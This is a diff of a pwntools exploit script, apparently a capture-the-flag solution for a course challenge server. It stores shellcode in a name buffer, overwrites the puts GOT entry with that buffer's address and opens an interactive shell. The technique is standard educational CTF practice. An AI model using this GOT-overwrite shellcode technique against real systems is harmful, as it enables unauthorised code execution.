@@ -2,34 +2,31 @@ from pwn import *
 
 context.arch = 'amd64'
 
-host = '127.0.0.1'
-port = 8888
-# host = 'csie.ctf.tw'
-# port = 10127
+# host = '127.0.0.1'
+# port = 8888
+host = 'csie.ctf.tw'
+port = 10129
 
 r = remote(host, port)
 
 put_got = 0x601020
-read_got = 0x601048
-
 your_name_addr = 0x6010a0
-where_want_write = 0x40098d
-ret_addr = 0x7fffffffdcd8
+where_want_write_addr = 0x40098d
 
-input('Press enter to continue.')
+# input('Press enter to continue.')
 
-# what's your name :
+# what's your name : (48 chars)
 r.recvuntil(':')
-# r.sendline(asm(pwnlib.shellcraft.linux.sh()))
-r.sendline(b'aaaaaaaaaaaaaaaa')
+payload = b'flag' + b'\0'
+payload += asm(pwnlib.shellcraft.linux.sh())
+r.sendline(payload)
 
-# Where do you want to write :
+# Where do you want to write : (24 chars)
 r.recvuntil(':')
-r.sendline(hex(ret_addr).encode())
+r.sendline(hex(put_got).encode())
 
-# data :
+# data : (8 chars)
 r.recvuntil(':')
-r.sendline(b'a'*8)
-# r.sendline(p64(where_want_write))
+r.sendline(p64(your_name_addr + 5))
 
 r.interactive()
